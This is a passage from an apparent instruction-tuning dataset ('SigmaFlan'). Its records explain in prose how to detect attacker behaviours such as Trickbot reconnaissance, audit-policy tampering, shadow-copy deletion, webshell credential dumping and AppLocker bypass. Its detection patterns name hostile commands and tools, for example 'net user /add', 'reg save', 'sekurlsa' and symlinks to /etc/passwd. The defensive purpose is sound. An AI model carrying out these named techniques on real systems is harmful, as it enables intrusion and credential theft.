      "answer": "In order to detect potential reconnaissance activity used by Trickbot malware, which enumerates domain/network topology and executes certain commands automatically every few minutes, you should: Monitor process creation logs on Windows systems for instances where the parent process is 'cmd.exe' and the child process is 'nltest.exe' executing the command line containing '/domain_trusts /all_trusts'. This pattern of activity is indicative of Trickbot's behavior to understand the network's structure, possibly for future malicious actions. Be aware that similar commands might occasionally be used by system administrators for legitimate purposes, so it's important to investigate potential hits before making a definitive assessment. The significance of detecting this pattern is classified as high due to its association with known malicious intent."
    }
  },
  {
    "instruction": "Explain how should I detect the following: Generic rule for SQL exceptions in Python according to PEP 249",
    "context": "",
    "output": "In order to detect generic SQL exceptions in Python applications as outlined in PEP 249, you should monitor application logs specifically from Python products. Look for the presence of specific keywords in these logs that indicate an SQL exception. The keywords to watch for include: 'DataError', 'IntegrityError', 'ProgrammingError', and 'OperationalError'. These keywords are indicative of various types of SQL errors that could signal either benign issues like application bugs or potentially malicious activities, such as SQL injection attempts.\n\nIt's important to note that the detection of these keywords in Python application logs is not conclusive evidence of an attack. False positives can occur, and one common source of these is bugs within the application itself. The risk level associated with detecting these keywords is considered medium, suggesting that while not all detections will be of malicious intent, they warrant further investigation to rule out or confirm suspicious activities. \n\nIn essence, by focusing on Python application logs and being alert to the specified keywords, you can identify SQL exceptions that may be indicative of attempted attacks following PEP 249 guidelines, while being mindful of the possibility of false positives due to application errors.",
    "category": "SigmaFlan",
    "instruction_type": "rule_goal_to_description",
    "parsed_raw_data": {
      "question": "Generic rule for SQL exceptions in Python according to PEP 249",
      "answer": "In order to detect generic SQL exceptions in Python applications as outlined in PEP 249, you should monitor application logs specifically from Python products. Look for the presence of specific keywords in these logs that indicate an SQL exception. The keywords to watch for include: 'DataError', 'IntegrityError', 'ProgrammingError', and 'OperationalError'. These keywords are indicative of various types of SQL errors that could signal either benign issues like application bugs or potentially malicious activities, such as SQL injection attempts.\n\nIt's important to note that the detection of these keywords in Python application logs is not conclusive evidence of an attack. False positives can occur, and one common source of these is bugs within the application itself. The risk level associated with detecting these keywords is considered medium, suggesting that while not all detections will be of malicious intent, they warrant further investigation to rule out or confirm suspicious activities. \n\nIn essence, by focusing on Python application logs and being alert to the specified keywords, you can identify SQL exceptions that may be indicative of attempted attacks following PEP 249 guidelines, while being mindful of the possibility of false positives due to application errors."
    }
  },
  {
    "instruction": "Can you explain how to detect: Threat actors can use an older version of the auditpol binary available inside the NT resource kit to change audit policy configuration to impair detection capability.\nThis can be carried out by selectively disabling/removing certain audit policies as well as restoring a custom policy owned by the threat actor.\n",
    "context": "",
    "output": "Certainly!\n\nIn order to thwart threat actors who use an older version of the auditpol binary available inside the NT resource kit to change audit policy configuration to impair detection capability, you should: Monitor for process creation events on Windows systems that include command-line activity with specific flags such as '/logon:none', '/system:none', '/sam:none', '/privilege:none', '/object:none', '/process:none', and '/policy:none'. These flags are indicators that an attempt is being made to selectively disable or remove certain audit policies or to restore a custom policy owned by the threat actor. It is important to note that the old auditpol utility is not available by default on more recent versions of Windows, as it has been replaced by a newer version, meaning the rate of false positives should be very low except in cases where tools use a similar flag structure. The severity of this detection is considered high, underscoring the importance of monitoring for these specific command-line flags to prevent threat actors from manipulating audit policies and evading detection.",
    "category": "SigmaFlan",
    "instruction_type": "rule_goal_to_description",
    "parsed_raw_data": {
      "question": "Threat actors can use an older version of the auditpol binary available inside the NT resource kit to change audit policy configuration to impair detection capability.\nThis can be carried out by selectively disabling/removing certain audit policies as well as restoring a custom policy owned by the threat actor.\n",
      "answer": "In order to thwart threat actors who use an older version of the auditpol binary available inside the NT resource kit to change audit policy configuration to impair detection capability, you should: Monitor for process creation events on Windows systems that include command-line activity with specific flags such as '/logon:none', '/system:none', '/sam:none', '/privilege:none', '/object:none', '/process:none', and '/policy:none'. These flags are indicators that an attempt is being made to selectively disable or remove certain audit policies or to restore a custom policy owned by the threat actor. It is important to note that the old auditpol utility is not available by default on more recent versions of Windows, as it has been replaced by a newer version, meaning the rate of false positives should be very low except in cases where tools use a similar flag structure. The severity of this detection is considered high, underscoring the importance of monitoring for these specific command-line flags to prevent threat actors from manipulating audit policies and evading detection."
    }
  },
  {
    "instruction": "How can I detect: indicators of APT 29 (Cozy Bear) phishing-campaign as reported by mandiant",
    "context": "",
    "output": "In order to detect indicators of APT 29 (Cozy Bear) phishing-campaign as reported by Mandiant, you should: focus on monitoring file events within Windows environments. Specifically, lookout for occurrences where files named 'ds7002.lnk', 'ds7002.pdf', or 'ds7002.zip' are involved. These particular file names have been identified as indicators of this phishing campaign, suggesting a malicious attempt to compromise the system. Since the probability of these specific file names appearing under legitimate circumstances is unlikely, any detection of these should be considered critical and warrants immediate investigation.",
    "category": "SigmaFlan",
    "instruction_type": "rule_goal_to_description",
    "parsed_raw_data": {
      "question": "indicators of APT 29 (Cozy Bear) phishing-campaign as reported by mandiant",
      "answer": "In order to detect indicators of APT 29 (Cozy Bear) phishing-campaign as reported by Mandiant, you should: focus on monitoring file events within Windows environments. Specifically, lookout for occurrences where files named 'ds7002.lnk', 'ds7002.pdf', or 'ds7002.zip' are involved. These particular file names have been identified as indicators of this phishing campaign, suggesting a malicious attempt to compromise the system. Since the probability of these specific file names appearing under legitimate circumstances is unlikely, any detection of these should be considered critical and warrants immediate investigation."
    }
  },
  {
    "instruction": "How can I detect: svchost hosting RDP termsvcs communicating to target systems on TCP port 80 or 443",
    "context": "",
    "output": "In order to detect svchost hosting RDP termsvcs communicating to target systems on TCP port 80 or 443, you should: monitor network connections on Windows systems for specific patterns. Focus on connections where the process image ends with '\\svchost.exe', which is initiated by this service. Particularly, pay attention to instances where this process, acting as a host, initiates connections from source port 3389, which is traditionally used for remote desktop protocol (RDP) services, to destination ports 80 (commonly used for HTTP traffic) or 443 (used for HTTPS traffic). These connection attempts are unusual for svchost.exe involved in RDP activities, as they indicate possible misuse of RDP services to communicate with external systems over web ports, potentially for command and control or data exfiltration purposes. It's vital to consider all detections related to these patterns with a high level of suspicion due to the possibly unknown nature of false positives, indicating a critical need for immediate investigation upon detection.",
    "category": "SigmaFlan",
    "instruction_type": "rule_goal_to_description",
    "parsed_raw_data": {
      "question": "svchost hosting RDP termsvcs communicating to target systems on TCP port 80 or 443",
      "answer": "In order to detect svchost hosting RDP termsvcs communicating to target systems on TCP port 80 or 443, you should: monitor network connections on Windows systems for specific patterns. Focus on connections where the process image ends with '\\svchost.exe', which is initiated by this service. Particularly, pay attention to instances where this process, acting as a host, initiates connections from source port 3389, which is traditionally used for remote desktop protocol (RDP) services, to destination ports 80 (commonly used for HTTP traffic) or 443 (used for HTTPS traffic). These connection attempts are unusual for svchost.exe involved in RDP activities, as they indicate possible misuse of RDP services to communicate with external systems over web ports, potentially for command and control or data exfiltration purposes. It's vital to consider all detections related to these patterns with a high level of suspicion due to the possibly unknown nature of false positives, indicating a critical need for immediate investigation upon detection."
    }
  },
  {
    "instruction": "How to detect: execution of executables that can be used to bypass Applocker whitelisting",
    "context": "",
    "output": "In order to detect execution of executables that can be used to bypass Applocker whitelisting, you should monitor the creation of processes in Windows environments for executions involving specific executables that are commonly leveraged by threat actors for this purpose. Observations to be on the lookout for include the execution of 'msdt.exe', 'installutil.exe', 'regsvcs.exe', 'regasm.exe', 'msbuild.exe', and 'ieexec.exe'. It's important to tailor the detection mechanism to account for legitimate use of these executables, as their usage can sometimes be benign, such as using 'installutil.exe' for adding features to .NET applications, especially within developer environments. Be aware that while monitoring these executables can help in identifying malicious activity aiming to bypass Applocker rules, the risk of false positives exists and should be managed by understanding the typical behavior within your monitored environment. This approach focuses on the process creation category, leveraging the ability to scan command-line inputs for the mentioned executables, thereby offering an effective strategy to spot potential bypass attempts.",
    "category": "SigmaFlan",
    "instruction_type": "rule_goal_to_description",
    "parsed_raw_data": {
      "question": "execution of executables that can be used to bypass Applocker whitelisting",
      "answer": "In order to detect execution of executables that can be used to bypass Applocker whitelisting, you should monitor the creation of processes in Windows environments for executions involving specific executables that are commonly leveraged by threat actors for this purpose. Observations to be on the lookout for include the execution of 'msdt.exe', 'installutil.exe', 'regsvcs.exe', 'regasm.exe', 'msbuild.exe', and 'ieexec.exe'. It's important to tailor the detection mechanism to account for legitimate use of these executables, as their usage can sometimes be benign, such as using 'installutil.exe' for adding features to .NET applications, especially within developer environments. Be aware that while monitoring these executables can help in identifying malicious activity aiming to bypass Applocker rules, the risk of false positives exists and should be managed by understanding the typical behavior within your monitored environment. This approach focuses on the process creation category, leveraging the ability to scan command-line inputs for the mentioned executables, thereby offering an effective strategy to spot potential bypass attempts."
    }
  },
  {
    "instruction": "Explain how should I detect the following: suspicious command lines that look as if they would create symbolic links to /etc/passwd",
    "context": "",
    "output": "In order to detect suspicious command lines that look as if they would create symbolic links to /etc/passwd, you should monitor for specific command line activities within Linux systems. Specifically, you should look for occurrences of command lines that include 'ln -s -f /etc/passwd' or 'ln -s /etc/passwd'. These commands are used to create symbolic links, and when they point to critical system files like /etc/passwd, it could indicate an attempt to gain unauthorized access to system credentials or manipulate user information. It's important to treat any detection of these commands with a high level of suspicion. There may be legitimate uses for these commands in certain contexts, but due to the potential for abuse, any detection should be carefully investigated to rule out malicious activity. This detection is integral to identifying tactics that involve unauthorized access or manipulation of system files, which could be indicative of broader malicious behaviors within a network.",
    "category": "SigmaFlan",
    "instruction_type": "rule_goal_to_description",
    "parsed_raw_data": {
      "question": "suspicious command lines that look as if they would create symbolic links to /etc/passwd",
      "answer": "In order to detect suspicious command lines that look as if they would create symbolic links to /etc/passwd, you should monitor for specific command line activities within Linux systems. Specifically, you should look for occurrences of command lines that include 'ln -s -f /etc/passwd' or 'ln -s /etc/passwd'. These commands are used to create symbolic links, and when they point to critical system files like /etc/passwd, it could indicate an attempt to gain unauthorized access to system credentials or manipulate user information. It's important to treat any detection of these commands with a high level of suspicion. There may be legitimate uses for these commands in certain contexts, but due to the potential for abuse, any detection should be carefully investigated to rule out malicious activity. This detection is integral to identifying tactics that involve unauthorized access or manipulation of system files, which could be indicative of broader malicious behaviors within a network."
    }
  },
  {
    "instruction": "Please help me detect the following: processes that query known 3rd party registry keys that holds credentials via commandline",
    "context": "",
    "output": "Sure!\nIn order to detect processes that query known 3rd party registry keys that holds credentials via commandline, you should monitor for process creation events on Windows systems where the command line includes references to specific registry paths. These paths are known to store sensitive information such as credentials for various applications, including PuTTY, MobaXterm, Radmin, Foxmail, IncrediMail, Eudora, B2 (presumably Becky! Internet Mail), OpenVPN-GUI, WinSCP, COREFTP, internet download managers, OpenSSH, TightVNC, WinVNC (both VNC3 and WinVNC4), suggesting that an attacker might be attempting to access stored credentials. This detection focuses on spotting suspicious activities where command lines contain references to these paths, which could indicate an attempt to extract sensitive data. Since these actions might yield some false positives due to legitimate process activities that also access these registry keys, it remains categorized at a medium level of alertness.",
    "category": "SigmaFlan",
    "instruction_type": "rule_goal_to_description",
    "parsed_raw_data": {
      "question": "processes that query known 3rd party registry keys that holds credentials via commandline",
      "answer": "In order to detect processes that query known 3rd party registry keys that holds credentials via commandline, you should monitor for process creation events on Windows systems where the command line includes references to specific registry paths. These paths are known to store sensitive information such as credentials for various applications, including PuTTY, MobaXterm, Radmin, Foxmail, IncrediMail, Eudora, B2 (presumably Becky! Internet Mail), OpenVPN-GUI, WinSCP, COREFTP, internet download managers, OpenSSH, TightVNC, WinVNC (both VNC3 and WinVNC4), suggesting that an attacker might be attempting to access stored credentials. This detection focuses on spotting suspicious activities where command lines contain references to these paths, which could indicate an attempt to extract sensitive data. Since these actions might yield some false positives due to legitimate process activities that also access these registry keys, it remains categorized at a medium level of alertness."
    }
  },
  {
    "instruction": "How to detect: usage of the \"Set-Service\" powershell cmdlet to configure a new SecurityDescriptor that allows a service to be hidden from other utilities such as \"sc.exe\", \"Get-Service\"...etc. (Works only in powershell 7)",
    "context": "",
    "output": "In order to detect usage of the \"Set-Service\" PowerShell cmdlet to configure a new SecurityDescriptor that allows a service to be hidden from other utilities such as \"sc.exe\", \"Get-Service\"...etc. (Works only in PowerShell 7), you should: monitor for PowerShell script activities within Windows environments, specifically focusing on Script Block Logging. You're looking for scripts attempting to manipulate service security descriptors in a manner that could hide the services from typical management tools. This involves identifying scripts containing arguments like '-SecurityDescriptorSddl' or '-sd' which are concerned with setting new security descriptors. Furthermore, the use of 'Set-Service' in combination with specific permission setting strings such as 'D;;', coupled with user rights strings like ';;;IU', ';;;SU', ';;;BA', ';;;SY', or ';;;WD', is a strong indicator of such malicious activity. These commands and permissions are designed to change service visibility and control, which could be an attempt to obscure a service from administrative or security scrutiny. False positives could occur, as these commands might rarely be used for legitimate purposes. However, given the high-risk nature of these actions, any detection should be investigated with appropriate caution.",
    "category": "SigmaFlan",
    "instruction_type": "rule_goal_to_description",
    "parsed_raw_data": {
      "question": "usage of the \"Set-Service\" powershell cmdlet to configure a new SecurityDescriptor that allows a service to be hidden from other utilities such as \"sc.exe\", \"Get-Service\"...etc. (Works only in powershell 7)",
      "answer": "In order to detect usage of the \"Set-Service\" PowerShell cmdlet to configure a new SecurityDescriptor that allows a service to be hidden from other utilities such as \"sc.exe\", \"Get-Service\"...etc. (Works only in PowerShell 7), you should: monitor for PowerShell script activities within Windows environments, specifically focusing on Script Block Logging. You're looking for scripts attempting to manipulate service security descriptors in a manner that could hide the services from typical management tools. This involves identifying scripts containing arguments like '-SecurityDescriptorSddl' or '-sd' which are concerned with setting new security descriptors. Furthermore, the use of 'Set-Service' in combination with specific permission setting strings such as 'D;;', coupled with user rights strings like ';;;IU', ';;;SU', ';;;BA', ';;;SY', or ';;;WD', is a strong indicator of such malicious activity. These commands and permissions are designed to change service visibility and control, which could be an attempt to obscure a service from administrative or security scrutiny. False positives could occur, as these commands might rarely be used for legitimate purposes. However, given the high-risk nature of these actions, any detection should be investigated with appropriate caution."
    }
  },
  {
    "instruction": "Explain how should I detect the following: changes to environment variables related to ETW logging. This could indicate potential adversaries stopping ETW providers recording loaded .NET assemblies.",
    "context": "",
    "output": "In order to detect changes to environment variables related to ETW logging, which could indicate potential adversaries stopping ETW providers from recording loaded .NET assemblies, you should: monitor the creation of processes on Windows systems, specifically looking for the presence of 'COMPlus_ETWEnabled' or 'COMPlus_ETWFlags' in the command line arguments. These particular strings are associated with environment variables that control ETW (Event Tracing for Windows) logging settings for .NET applications. A change or manipulation of these could suggest an attempt to evade detection by disabling logging of .NET assembly loads. Such activities are considered highly suspicious and are unlikely to produce false positives, highlighting the significance of detecting these specific command line arguments.",
    "category": "SigmaFlan",
    "instruction_type": "rule_goal_to_description",
    "parsed_raw_data": {
      "question": "changes to environment variables related to ETW logging. This could indicate potential adversaries stopping ETW providers recording loaded .NET assemblies.",
      "answer": "In order to detect changes to environment variables related to ETW logging, which could indicate potential adversaries stopping ETW providers from recording loaded .NET assemblies, you should: monitor the creation of processes on Windows systems, specifically looking for the presence of 'COMPlus_ETWEnabled' or 'COMPlus_ETWFlags' in the command line arguments. These particular strings are associated with environment variables that control ETW (Event Tracing for Windows) logging settings for .NET applications. A change or manipulation of these could suggest an attempt to evade detection by disabling logging of .NET assembly loads. Such activities are considered highly suspicious and are unlikely to produce false positives, highlighting the significance of detecting these specific command line arguments."
    }
  },
  {
    "instruction": "Can you explain how to detect: deletion of Windows Volume Shadow Copies with PowerShell code and Get-WMIObject. This technique is used by numerous ransomware families such as Sodinokibi/REvil",
    "context": "",
    "output": "Certainly!\n\nIn order to detect deletion of Windows Volume Shadow Copies with PowerShell code and Get-WMIObject, a technique used by numerous ransomware families such as Sodinokibi/REvil, you should: monitor PowerShell scripts on Windows systems for specific command and method invocations. Pay special attention to scripts that contain the commands 'Get-WmiObject', 'gwmi', 'Get-CimInstance', 'gcim' which are used to interact with Windows Management Instrumentation (WMI) objects, and 'Win32_Shadowcopy' indicating interaction with Windows Volume Shadow Copies. Also, be alert for the presence of '.Delete()', 'Remove-WmiObject', 'rwmi', 'Remove-CimInstance', or 'rcim' within the scripts, as these are indicative of attempts to delete objects, including Shadow Copies. Implementing monitoring based on these script contents can help in early detection of ransomware activity that attempts this specific kind of attack.",
    "category": "SigmaFlan",
    "instruction_type": "rule_goal_to_description",
    "parsed_raw_data": {
      "question": "deletion of Windows Volume Shadow Copies with PowerShell code and Get-WMIObject. This technique is used by numerous ransomware families such as Sodinokibi/REvil",
      "answer": "In order to detect deletion of Windows Volume Shadow Copies with PowerShell code and Get-WMIObject, a technique used by numerous ransomware families such as Sodinokibi/REvil, you should: monitor PowerShell scripts on Windows systems for specific command and method invocations. Pay special attention to scripts that contain the commands 'Get-WmiObject', 'gwmi', 'Get-CimInstance', 'gcim' which are used to interact with Windows Management Instrumentation (WMI) objects, and 'Win32_Shadowcopy' indicating interaction with Windows Volume Shadow Copies. Also, be alert for the presence of '.Delete()', 'Remove-WmiObject', 'rwmi', 'Remove-CimInstance', or 'rcim' within the scripts, as these are indicative of attempts to delete objects, including Shadow Copies. Implementing monitoring based on these script contents can help in early detection of ransomware activity that attempts this specific kind of attack."
    }
  },
  {
    "instruction": "Please help me detect the following: PowerShell module creation where the module Contents are set to \"function Get-VMRemoteFXPhysicalVideoAdapter\". This could be a sign of potential abuse of  the \"RemoteFXvGPUDisablement.exe\" binary which is known to be vulnerable to module load-order hijacking.",
    "context": "",
    "output": "Sure!\nIn order to detect PowerShell module creation where the module Contents are set to \"function Get-VMRemoteFXPhysicalVideoAdapter\". This could be a sign of potential abuse of the \"RemoteFXvGPUDisablement.exe\" binary which is known to be vulnerable to module load-order hijacking, you should: Monitor Windows PowerShell Classic service logs for activities involving the creation of PowerShell modules with specific contents. Specifically, search for instances where data contains the function definition 'ModuleContents=function Get-VMRemoteFXPhysicalVideoAdapter {'. This specific function could indicate an attempt to exploit vulnerabilities in the \"RemoteFXvGPUDisablement.exe\" binary, often by manipulating the module load order which can lead to unauthorized actions or access. It is important to consider that there might be false positives since the nature or intent of PowerShell module creation can be unknown or benign. The criticality of monitoring this activity is high due to the potential security implications associated with the exploitation of known vulnerabilities.",
    "category": "SigmaFlan",
    "instruction_type": "rule_goal_to_description",
    "parsed_raw_data": {
      "question": "PowerShell module creation where the module Contents are set to \"function Get-VMRemoteFXPhysicalVideoAdapter\". This could be a sign of potential abuse of  the \"RemoteFXvGPUDisablement.exe\" binary which is known to be vulnerable to module load-order hijacking.",
      "answer": "In order to detect PowerShell module creation where the module Contents are set to \"function Get-VMRemoteFXPhysicalVideoAdapter\". This could be a sign of potential abuse of the \"RemoteFXvGPUDisablement.exe\" binary which is known to be vulnerable to module load-order hijacking, you should: Monitor Windows PowerShell Classic service logs for activities involving the creation of PowerShell modules with specific contents. Specifically, search for instances where data contains the function definition 'ModuleContents=function Get-VMRemoteFXPhysicalVideoAdapter {'. This specific function could indicate an attempt to exploit vulnerabilities in the \"RemoteFXvGPUDisablement.exe\" binary, often by manipulating the module load order which can lead to unauthorized actions or access. It is important to consider that there might be false positives since the nature or intent of PowerShell module creation can be unknown or benign. The criticality of monitoring this activity is high due to the potential security implications associated with the exploitation of known vulnerabilities."
    }
  },
  {
    "instruction": "How to detect: Adversaries may abuse PowerShell commands and scripts for execution.\nPowerShell is a powerful interactive command-line interface and scripting environment included in the Windows operating system. (Citation: TechNet PowerShell)\nAdversaries can use PowerShell to perform a number of actions, including discovery of information and execution of code\n",
    "context": "",
    "output": "In order to prevent adversaries from abusing PowerShell commands and scripts for execution, you should monitor PowerShell script activities specifically for patterns that might indicate malicious behavior. This involves looking for the use of certain PowerShell cmdlets and syntaxes. To do this effectively, ensure that Script Block Logging is enabled on Windows systems, as this will allow for the detailed logging of PowerShell script executions.\n\nPay close attention to scripts that attempt to create new objects using the `New-Object` command, especially those involving `System.Xml.XmlDocument` and subsequently call the `.Load` method. This pattern can be indicative of scripts trying to load and parse XML content, which might be used in various attack scenarios, such as downloading and executing malicious code.\n\nAdditionally, watch for the utilization of `Invoke-Expression`, `Invoke-Command`, or abbreviated versions like `IEX` and `ICM -`. These commands can execute strings as PowerShell code, which is a common technique used by attackers to run malicious code on a system without writing it to disk, thus evading traditional antivirus detections.\n\nBe aware that while monitoring for these specific command patterns can significantly aid in detecting potential PowerShell abuse, it can also lead to false positives. For instance, legitimate administrative activities might make use of these commands and scripts for valid purposes. Therefore, context and additional investigation are key to distinguishing between malicious activities and legitimate ones. The detection effort is considered to have a medium level of urgency, meaning while it's important to address, it should be balanced against other security priorities.",
    "category": "SigmaFlan",
    "instruction_type": "rule_goal_to_description",
    "parsed_raw_data": {
      "question": "Adversaries may abuse PowerShell commands and scripts for execution.\nPowerShell is a powerful interactive command-line interface and scripting environment included in the Windows operating system. (Citation: TechNet PowerShell)\nAdversaries can use PowerShell to perform a number of actions, including discovery of information and execution of code\n",
      "answer": "In order to prevent adversaries from abusing PowerShell commands and scripts for execution, you should monitor PowerShell script activities specifically for patterns that might indicate malicious behavior. This involves looking for the use of certain PowerShell cmdlets and syntaxes. To do this effectively, ensure that Script Block Logging is enabled on Windows systems, as this will allow for the detailed logging of PowerShell script executions.\n\nPay close attention to scripts that attempt to create new objects using the `New-Object` command, especially those involving `System.Xml.XmlDocument` and subsequently call the `.Load` method. This pattern can be indicative of scripts trying to load and parse XML content, which might be used in various attack scenarios, such as downloading and executing malicious code.\n\nAdditionally, watch for the utilization of `Invoke-Expression`, `Invoke-Command`, or abbreviated versions like `IEX` and `ICM -`. These commands can execute strings as PowerShell code, which is a common technique used by attackers to run malicious code on a system without writing it to disk, thus evading traditional antivirus detections.\n\nBe aware that while monitoring for these specific command patterns can significantly aid in detecting potential PowerShell abuse, it can also lead to false positives. For instance, legitimate administrative activities might make use of these commands and scripts for valid purposes. Therefore, context and additional investigation are key to distinguishing between malicious activities and legitimate ones. The detection effort is considered to have a medium level of urgency, meaning while it's important to address, it should be balanced against other security priorities."
    }
  },
  {
    "instruction": "How to detect: Masquerading occurs when the name or location of an executable, legitimate or malicious, is manipulated or abused for the sake of evading defenses and observation.\nSeveral different variations of this technique have been observed.\n",
    "context": "",
    "output": "In order to detect and understand how masquerading occurs when the name or location of an executable, legitimate or malicious, is manipulated or abused for the sake of evading defenses and observation, and considering that several different variations of this technique have been observed, you should: Focus on monitoring audit logs from Linux systems, specifically by leveraging the auditd service for detecting execution events. In this context, you are looking for instances where the 'cp' command is executed with the '-i' flag, copying the '/bin/sh' file. This becomes particularly suspicious and worth investigating when the destination of the copy operation ends with '/crond', suggesting an attempt to masquerade a shell as a cron daemon file, potentially to evade detection or maintain persistence on a system. The detection of such an event should be classified with a medium level of concern. It's essential to monitor this kind of behavior as it relates to prevalent adversarial tactics and techniques, such as Defense Evasion, Execution, and Persistence.",
    "category": "SigmaFlan",
    "instruction_type": "rule_goal_to_description",
    "parsed_raw_data": {
      "question": "Masquerading occurs when the name or location of an executable, legitimate or malicious, is manipulated or abused for the sake of evading defenses and observation.\nSeveral different variations of this technique have been observed.\n",
      "answer": "In order to detect and understand how masquerading occurs when the name or location of an executable, legitimate or malicious, is manipulated or abused for the sake of evading defenses and observation, and considering that several different variations of this technique have been observed, you should: Focus on monitoring audit logs from Linux systems, specifically by leveraging the auditd service for detecting execution events. In this context, you are looking for instances where the 'cp' command is executed with the '-i' flag, copying the '/bin/sh' file. This becomes particularly suspicious and worth investigating when the destination of the copy operation ends with '/crond', suggesting an attempt to masquerade a shell as a cron daemon file, potentially to evade detection or maintain persistence on a system. The detection of such an event should be classified with a medium level of concern. It's essential to monitor this kind of behavior as it relates to prevalent adversarial tactics and techniques, such as Defense Evasion, Execution, and Persistence."
    }
  },
  {
    "instruction": "Explain how should I detect the following: certain parent child patterns found in cases in which a webshell is used to perform certain credential dumping or exfiltration activities on a compromised system",
    "context": "",
    "output": "In order to detect certain parent-child patterns found in cases in which a webshell is used to perform certain credential dumping or exfiltration activities on a compromised system, you should monitor process creation logs on Windows systems for specific patterns of activity. Focus on observing processes originating from known web server executables like `w3wp.exe`, `php-cgi.exe`, `nginx.exe`, `httpd.exe`, `caddy.exe`, and `ws_tomcatservice.exe`. Additionally, pay close attention to processes initiated by or related to `java.exe` and `javaw.exe` that have a connection with Tomcat, signified by the presence of \"-tomcat-\" in their paths or command lines including references to `catalina.jar` or `CATALINA_HOME`.\n\nKeep an eye out for suspicious child processes that might indicate malicious activity. This includes processes associated with process dumping efforts (`rundll32`, `comsvcs`); data exfiltration attempts using Winrar (`-hp`, `a`, `-m` in the command line); user account manipulation through commands like adding new users (`net user /add`) or adding users to the administrators group (`net localgroup administrators /add`); as well as processes typical for credential theft, Active Directory recon, process dumping, and system destruction or ransomware actions (`ntdsutil.exe`, `ldifde.exe`, `adfind.exe`, `procdump.exe`, `Nanodump.exe`, `vssadmin.exe`, `fsutil.exe`).\n\nAlso, remain vigilant for suspicious command line patterns often used in malicious PowerShell commands (`-NoP`, `-W Hidden`), decoding activities (with `certutil` or `PowerShell`), registry operations indicative of syskey extraction (`reg save`), methods to download or execute encoded payloads within PowerShell, and techniques related to ticket or credentials theft and manipulation (`/ticket:`, `sekurlsa`). \n\nDetection should trigger if at least one pattern from the specified web server processes is observed alongside one indication of suspicious child process activity. False positives are considered unlikely due to the specificity of these patterns, indicating a high level of certainty when such activities are flagged.",
    "category": "SigmaFlan",
    "instruction_type": "rule_goal_to_description",
    "parsed_raw_data": {
      "question": "certain parent child patterns found in cases in which a webshell is used to perform certain credential dumping or exfiltration activities on a compromised system",
      "answer": "In order to detect certain parent-child patterns found in cases in which a webshell is used to perform certain credential dumping or exfiltration activities on a compromised system, you should monitor process creation logs on Windows systems for specific patterns of activity. Focus on observing processes originating from known web server executables like `w3wp.exe`, `php-cgi.exe`, `nginx.exe`, `httpd.exe`, `caddy.exe`, and `ws_tomcatservice.exe`. Additionally, pay close attention to processes initiated by or related to `java.exe` and `javaw.exe` that have a connection with Tomcat, signified by the presence of \"-tomcat-\" in their paths or command lines including references to `catalina.jar` or `CATALINA_HOME`.\n\nKeep an eye out for suspicious child processes that might indicate malicious activity. This includes processes associated with process dumping efforts (`rundll32`, `comsvcs`); data exfiltration attempts using Winrar (`-hp`, `a`, `-m` in the command line); user account manipulation through commands like adding new users (`net user /add`) or adding users to the administrators group (`net localgroup administrators /add`); as well as processes typical for credential theft, Active Directory recon, process dumping, and system destruction or ransomware actions (`ntdsutil.exe`, `ldifde.exe`, `adfind.exe`, `procdump.exe`, `Nanodump.exe`, `vssadmin.exe`, `fsutil.exe`).\n\nAlso, remain vigilant for suspicious command line patterns often used in malicious PowerShell commands (`-NoP`, `-W Hidden`), decoding activities (with `certutil` or `PowerShell`), registry operations indicative of syskey extraction (`reg save`), methods to download or execute encoded payloads within PowerShell, and techniques related to ticket or credentials theft and manipulation (`/ticket:`, `sekurlsa`). \n\nDetection should trigger if at least one pattern from the specified web server processes is observed alongside one indication of suspicious child process activity. False positives are considered unlikely due to the specificity of these patterns, indicating a high level of certainty when such activities are flagged."
    }
  },
  {
    "instruction": "Please help me detect the following: suspicious patterns in program names or folders that are often found in malicious samples or hacktools",
    "context": "",
    "output": "Sure!\nIn order to detect suspicious patterns in program names or folders that are often found in malicious samples or hacktools, you should monitor process creation events within Windows environments for specific patterns in the names of executables or PowerShell scripts indicative of exploitation attempts or malware. Specifically, look out for executables or command lines that include names containing or ending with terms like 'CVE-202' (implying an exploitation of known vulnerabilities), 'poc.exe', 'artifact.exe', or variations thereof indicating potential malicious artifacts aimed at exploiting these vulnerabilities. Additionally, PowerShell script names containing 'inject.ps1', 'Invoke-CVE', 'pupy.ps1', or similar patterns should raise alarms as they often correspond to scripts used in penetration testing tools or malware payloads designed to exploit vulnerabilities, inject malicious code, or perform reconnaissance within a compromised system. Pay attention to such activity across the system, especially if the command lines involve scripts with names that suggest obfuscation, exploitation, or common hacking toolkits like 'mimikatz.ps1' for credential dumping or 'PowerUp.ps1' for privilege escalation. False positives may occur with legitimate tools that use similar naming conventions; thus, context and additional investigation are necessary to differentiate benign from malicious activities. Be particularly vigilant for processes that have command-line arguments or binary paths containing these indicators, as they are associated with high-risk behaviors.",
    "category": "SigmaFlan",
    "instruction_type": "rule_goal_to_description",
    "parsed_raw_data": {
      "question": "suspicious patterns in program names or folders that are often found in malicious samples or hacktools",
      "answer": "In order to detect suspicious patterns in program names or folders that are often found in malicious samples or hacktools, you should monitor process creation events within Windows environments for specific patterns in the names of executables or PowerShell scripts indicative of exploitation attempts or malware. Specifically, look out for executables or command lines that include names containing or ending with terms like 'CVE-202' (implying an exploitation of known vulnerabilities), 'poc.exe', 'artifact.exe', or variations thereof indicating potential malicious artifacts aimed at exploiting these vulnerabilities. Additionally, PowerShell script names containing 'inject.ps1', 'Invoke-CVE', 'pupy.ps1', or similar patterns should raise alarms as they often correspond to scripts used in penetration testing tools or malware payloads designed to exploit vulnerabilities, inject malicious code, or perform reconnaissance within a compromised system. Pay attention to such activity across the system, especially if the command lines involve scripts with names that suggest obfuscation, exploitation, or common hacking toolkits like 'mimikatz.ps1' for credential dumping or 'PowerUp.ps1' for privilege escalation. False positives may occur with legitimate tools that use similar naming conventions; thus, context and additional investigation are necessary to differentiate benign from malicious activities. Be particularly vigilant for processes that have command-line arguments or binary paths containing these indicators, as they are associated with high-risk behaviors."
    }
  },
  {
    "instruction": "How to detect: deactivation and disabling of the Scheduled defragmentation task as seen by Slingshot APT group",
    "context": "",
